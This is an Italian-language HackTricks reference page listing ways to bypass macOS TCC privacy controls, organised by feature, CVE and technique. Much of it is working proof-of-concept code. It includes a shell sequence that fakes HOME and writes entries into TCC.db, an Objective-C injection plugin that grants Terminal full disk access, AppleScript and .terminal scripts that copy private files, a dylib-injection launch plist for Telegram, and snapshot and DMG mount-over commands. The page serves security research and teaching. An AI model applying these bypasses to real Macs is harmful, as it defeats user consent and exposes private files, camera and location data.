# Bypass di macOS TCC

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in formato PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) su GitHub.

</details>

## Per funzionalità

### Bypass di scrittura

Questo non è un bypass, è solo il modo in cui funziona TCC: **non protegge dalla scrittura**. Se il Terminale **non ha accesso alla lettura della Scrivania di un utente, può comunque scriverci dentro**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
L'attributo esteso `com.apple.macl` viene aggiunto al nuovo **file** per consentire all'applicazione del creatore di accedervi in lettura.

### Bypass SSH

Di default, l'accesso tramite **SSH aveva "Accesso completo al disco"**. Per disabilitarlo, è necessario averlo elencato ma disabilitato (rimuoverlo dalla lista non rimuoverà questi privilegi):

![](<../../../../../.gitbook/assets/image (569).png>)

Qui puoi trovare esempi di come alcuni **malware siano riusciti a eludere questa protezione**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Nota che ora, per poter abilitare SSH, è necessario avere **Accesso completo al disco**
{% endhint %}

### Gestione delle estensioni - CVE-2022-26767

L'attributo **`com.apple.macl`** viene assegnato ai file per dare a una **determinata applicazione le autorizzazioni per leggerlo**. Questo attributo viene impostato quando si **trascina e rilascia** un file su un'app o quando un utente **fa doppio clic** su un file per aprirlo con l'applicazione predefinita.

Pertanto, un utente potrebbe **registrare un'applicazione malevola** per gestire tutte le estensioni e chiamare Launch Services per **aprire** qualsiasi file (quindi il file malevolo otterrà l'accesso in lettura).

### iCloud

Con l'entitlement **`com.apple.private.icloud-account-access`** è possibile comunicare con il servizio XPC **`com.apple.iCloudHelper`** che fornirà i token di iCloud.

**iMovie** e **Garageband** avevano questo entitlement e altri che lo consentivano.

Per ulteriori **informazioni** sull'exploit per **ottenere i token di iCloud** da tale entitlement, consulta la presentazione: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automazione

Un'app con il permesso **`kTCCServiceAppleEvents`** sarà in grado di **controllare altre app**. Ciò significa che potrebbe essere in grado di **abusare dei permessi concessi alle altre app**.

Per ulteriori informazioni sugli Apple Script, consulta:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Ad esempio, se un'app ha il **permesso di Automazione su `iTerm`**, ad esempio in questo esempio **`Terminal`** ha accesso a iTerm:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Su iTerm

Terminal, che non ha FDA, può chiamare iTerm, che lo ha, e usarlo per eseguire azioni:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Su Finder

Oppure, se un'app ha accesso su Finder, potrebbe utilizzare uno script come questo:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Per comportamento dell'app

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Il demone **tccd** in userland utilizza la variabile di ambiente **`HOME`** per accedere al database degli utenti TCC da: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Secondo [questo post di Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) e poiché il demone TCC viene eseguito tramite `launchd` all'interno del dominio dell'utente corrente, è possibile **controllare tutte le variabili di ambiente** passate ad esso.\
Di conseguenza, un **attaccante potrebbe impostare la variabile di ambiente `$HOME`** in **`launchctl`** per puntare a una **directory controllata**, **riavviare** il demone **TCC** e quindi **modificare direttamente il database TCC** per ottenere **tutti i privilegi TCC disponibili** senza mai richiedere l'autorizzazione all'utente finale.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Note

Note aveva accesso a posizioni protette da TCC, ma quando viene creato un appunto questo viene creato in una posizione non protetta. Quindi, è possibile chiedere a Note di copiare un file protetto in un appunto (quindi in una posizione non protetta) e quindi accedere al file:

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Il binario `/usr/libexec/lsd` con la libreria `libsecurity_translocate` aveva l'entitlement `com.apple.private.nullfs_allow` che gli permetteva di creare un mount **nullfs** e aveva l'entitlement `com.apple.private.tcc.allow` con **`kTCCServiceSystemPolicyAllFiles`** per accedere a tutti i file.

Era possibile aggiungere l'attributo di quarantena a "Library", chiamare il servizio XPC **`com.apple.security.translocation`** e quindi mappare Library a **`$TMPDIR/AppTranslocation/d/d/Library`** dove tutti i documenti all'interno di Library potevano essere **accessati**.

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** ha una caratteristica interessante: quando è in esecuzione, importerà i file rilasciati in **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** nella "media library" dell'utente. Inoltre, chiama qualcosa del tipo: **`rename(a, b);`** dove `a` e `b` sono:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

Questo comportamento di **`rename(a, b);`** è vulnerabile a una **Race Condition**, poiché è possibile inserire nella cartella `Automatically Add to Music.localized` un falso file **TCC.db** e quindi, quando viene creato il nuovo percorso(b) per copiare il file, eliminarlo e puntarlo a **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

Se **`SQLITE_SQLLOG_DIR="path/folder"`**, significa essenzialmente che **qualsiasi database aperto viene copiato in quel percorso**. In questo CVE, questo controllo è stato abusato per **scrivere** all'interno di un **database SQLite** che verrà **aperto da un processo con FDA il database TCC**, e quindi abusare di **`SQLITE_SQLLOG_DIR`** con un **symlink nel nome del file** in modo che quando quel database viene **aperto**, il database utente **TCC.db viene sovrascritto** con quello aperto.\
**Ulteriori informazioni** [**nel writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **e**[ **nel talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

Se la variabile d'ambiente **`SQLITE_AUTO_TRACE`** è impostata, la libreria **`libsqlite3.dylib`** inizierà a **registrare** tutte le query SQL. Molti applicazioni utilizzavano questa libreria, quindi era possibile registrare tutte le loro query SQLite.

Diverse applicazioni Apple utilizzavano questa libreria per accedere a informazioni protette da TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

Questa **variabile di ambiente viene utilizzata dal framework `Metal`**, che è una dipendenza di vari programmi, in particolare `Music`, che ha FDA.

Impostando quanto segue: `MTL_DUMP_PIPELINES_TO_JSON_FILE="percorso/nome"`. Se `percorso` è una directory valida, il bug verrà attivato e possiamo utilizzare `fs_usage` per vedere cosa sta succedendo nel programma:

* verrà aperto un file chiamato `path/.dat.nosyncXXXX.XXXXXX` (X è casuale)
* uno o più `write()` scriveranno i contenuti nel file (non controlliamo questo)
* `path/.dat.nosyncXXXX.XXXXXX` verrà rinominato in `path/nome`

Si tratta di una scrittura temporanea su file, seguita da un **`rename(old, new)`** **che non è sicuro**.

Non è sicuro perché deve **risolvere separatamente i percorsi vecchi e nuovi**, il che può richiedere del tempo e può essere vulnerabile a una Race Condition. Per ulteriori informazioni è possibile consultare la funzione `xnu` `renameat_internal()`.

{% hint style="danger" %}
In sostanza, se un processo privilegiato rinomina da una cartella da te controllata, potresti ottenere un RCE e farlo accedere a un file diverso o, come in questo CVE, aprire il file creato dall'app privilegiata e memorizzare un FD.

Se la rinomina accede a una cartella da te controllata, mentre hai modificato il file di origine o hai un FD ad esso, puoi modificare il file di destinazione (o la cartella) in modo che punti a un symlink, in modo da poter scrivere quando vuoi.
{% endhint %}

Questo è stato l'attacco nel CVE: ad esempio, per sovrascrivere il database dell'utente `TCC.db`, possiamo:

* creare `/Users/hacker/ourlink` che punta a `/Users/hacker/Library/Application Support/com.apple.TCC/`
* creare la directory `/Users/hacker/tmp/`
* impostare `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
* attivare il bug eseguendo `Music` con questa variabile di ambiente
* catturare l'`open()` di `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X è casuale)
* qui apriamo anche questo file in scrittura e conserviamo il file descriptor
* scambiamo atomicamente `/Users/hacker/tmp` con `/Users/hacker/ourlink` **in un ciclo**
* facciamo questo per massimizzare le nostre possibilità di successo poiché la finestra di gara è molto breve, ma perdere la gara ha un impatto trascurabile
* aspettiamo un po'
* verifichiamo se siamo stati fortunati
* se no, ripartiamo dall'inizio

Ulteriori informazioni su [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
Ora, se provi a utilizzare la variabile di ambiente `MTL_DUMP_PIPELINES_TO_JSON_FILE`, le app non si avvieranno.
{% endhint %}

### Apple Remote Desktop

Come utente root, è possibile abilitare questo servizio e l'**agente ARD avrà accesso completo al disco**, che potrebbe quindi essere abusato da un utente per copiare un nuovo **database utente TCC**.

## Tramite **NFSHomeDirectory**

TCC utilizza un database nella cartella HOME dell'utente per controllare l'accesso alle risorse specifiche dell'utente in **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Pertanto, se l'utente riesce a riavviare TCC con una variabile di ambiente `$HOME` che punta a una **cartella diversa**, l'utente potrebbe creare un nuovo database TCC in **/Library/Application Support/com.apple.TCC/TCC.db** e ingannare TCC per concedere qualsiasi autorizzazione TCC a qualsiasi app.

{% hint style="success" %}
Si noti che Apple utilizza l'impostazione memorizzata all'interno del profilo dell'utente nell'attributo **`NFSHomeDirectory`** come valore di `$HOME`, quindi se si compromette un'applicazione con autorizzazioni per modificare questo valore (**`kTCCServiceSystemPolicySysAdminFiles`**), è possibile **sfruttare** questa opzione con un bypass di TCC.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Il **primo POC** utilizza [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) e [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) per modificare la cartella **HOME** dell'utente.

1. Ottenere un blob _csreq_ per l'applicazione di destinazione.
2. Piazzare un falso file _TCC.db_ con l'accesso richiesto e il blob _csreq_.
3. Esportare l'entry dei servizi di directory dell'utente con [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modificare l'entry dei servizi di directory per cambiare la cartella home dell'utente.
5. Importare l'entry dei servizi di directory modificata con [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Arrestare il processo _tccd_ dell'utente e riavviarlo.

Il secondo POC utilizzava **`/usr/libexec/configd`** che aveva `com.apple.private.tcc.allow` con il valore `kTCCServiceSystemPolicySysAdminFiles`.\
Era possibile eseguire **`configd`** con l'opzione **`-t`**, un attaccante poteva specificare un **Bundle personalizzato da caricare**. Pertanto, l'exploit **sostituiva** il metodo **`dsexport`** e **`dsimport`** per cambiare la cartella home dell'utente con un **iniezione di codice `configd`**.

Per ulteriori informazioni, consultare il [**rapporto originale**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Tramite iniezione di processo

Esistono diverse tecniche per iniettare codice all'interno di un processo e sfruttare i suoi privilegi TCC:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

Inoltre, l'iniezione di processo più comune per eludere TCC avviene tramite **plugin (caricamento di librerie)**.\
I plugin sono codice aggiuntivo solitamente sotto forma di librerie o plist, che verranno **caricati dall'applicazione principale** ed eseguiti nel suo contesto. Pertanto, se l'applicazione principale aveva accesso a file TCC limitati (tramite autorizzazioni concesse o entitlement), il **codice personalizzato avrà lo stesso accesso**.

### CVE-2020-27937 - Directory Utility

L'applicazione `/System/Library/CoreServices/Applications/Directory Utility.app` aveva l'entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, caricava plugin con estensione **`.daplug`** e **non aveva l'esecuzione protetta**.

Per sfruttare questo CVE, viene **modificato** il **`NFSHomeDirectory`** (sfruttando l'entitlement precedente) al fine di poter **prendere il controllo del database TCC degli utenti** per eludere TCC.

Per ulteriori informazioni, consultare il [**rapporto originale**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).
### CVE-2020-29621 - Coreaudiod

Il binario **`/usr/sbin/coreaudiod`** aveva i diritti `com.apple.security.cs.disable-library-validation` e `com.apple.private.tcc.manager`. Il primo permetteva l'**iniezione di codice** e il secondo gli dava accesso per **gestire TCC**.

Questo binario permetteva di caricare **plug-in di terze parti** dalla cartella `/Library/Audio/Plug-Ins/HAL`. Pertanto, era possibile **caricare un plugin e abusare dei permessi TCC** con questo PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Per ulteriori informazioni, consulta il [**rapporto originale**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Plug-in del Device Abstraction Layer (DAL)

Le applicazioni di sistema che aprono lo streaming della fotocamera tramite Core Media I/O (app con **`kTCCServiceCamera`**) caricano **in processo questi plugin** situati in `/Library/CoreMediaIO/Plug-Ins/DAL` (non soggetti a restrizioni SIP).

Basta memorizzare lì una libreria con il **costruttore** comune per riuscire a **iniettare codice**.

Diverse applicazioni Apple erano vulnerabili a questo.

### Firefox

L'applicazione Firefox aveva i privilegi `com.apple.security.cs.disable-library-validation` e `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Per ulteriori informazioni su come sfruttare facilmente questo [**controlla il rapporto originale**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Il binario `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` aveva i privilegi **`com.apple.private.tcc.allow`** e **`com.apple.security.get-task-allow`**, che consentivano di iniettare codice all'interno del processo e utilizzare i privilegi TCC.

### CVE-2023-26818 - Telegram

Telegram aveva i privilegi **`com.apple.security.cs.allow-dyld-environment-variables`** e **`com.apple.security.cs.disable-library-validation`**, quindi era possibile abusarne per **accedere ai suoi permessi**, come ad esempio registrare con la fotocamera. Puoi [**trovare il payload nella descrizione**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Nota come utilizzare la variabile di ambiente per caricare una libreria è stato creato un **plist personalizzato** per iniettare questa libreria e **`launchctl`** è stato utilizzato per avviarla:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Attraverso le invocazioni di apertura

È possibile invocare **`open`** anche quando si è in modalità sandbox

### Script del Terminale

È abbastanza comune concedere al terminale **Accesso completo al disco (FDA)**, almeno nei computer utilizzati da persone del settore tecnologico. Ed è possibile invocare gli script **`.terminal`** utilizzando questa funzionalità.

Gli script **`.terminal`** sono file plist come questo, con il comando da eseguire nella chiave **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Un'applicazione potrebbe scrivere uno script di terminale in una posizione come /tmp e avviarlo con un comando come:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Montando

### CVE-2020-9771 - bypass di TCC di mount\_apfs e escalation dei privilegi

**Qualsiasi utente** (anche non privilegiato) può creare e montare uno snapshot di Time Machine e **accedere a TUTTI i file** di tale snapshot.\
L'unico privilegio necessario è che l'applicazione utilizzata (come `Terminal`) abbia l'accesso **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), che deve essere concesso da un amministratore.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Una spiegazione più dettagliata può essere trovata nel [**rapporto originale**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Montaggio sopra il file TCC

Anche se il file TCC DB è protetto, era possibile **montare sopra la directory** un nuovo file TCC.db:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Controlla l'**exploit completo** nella [**guida originale**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

Lo strumento **`/usr/sbin/asr`** consentiva di copiare l'intero disco e montarlo in un'altra posizione bypassando le protezioni TCC.

### Servizi di localizzazione

Esiste un terzo database TCC in **`/var/db/locationd/clients.plist`** per indicare i client autorizzati ad **accedere ai servizi di localizzazione**.\
La cartella **`/var/db/locationd/` non era protetta dal montaggio DMG**, quindi era possibile montare il nostro plist.

## Attraverso le applicazioni di avvio

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## Attraverso grep

In diverse occasioni, i file memorizzeranno informazioni sensibili come email, numeri di telefono, messaggi... in posizioni non protette (che costituiscono una vulnerabilità in Apple).

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## Click sintetici

Questo non funziona più, ma [**funzionava in passato**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Un altro modo utilizzando [**eventi CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## Riferimenti

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Modi per Bypassare i Meccanismi di Privacy di macOS**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
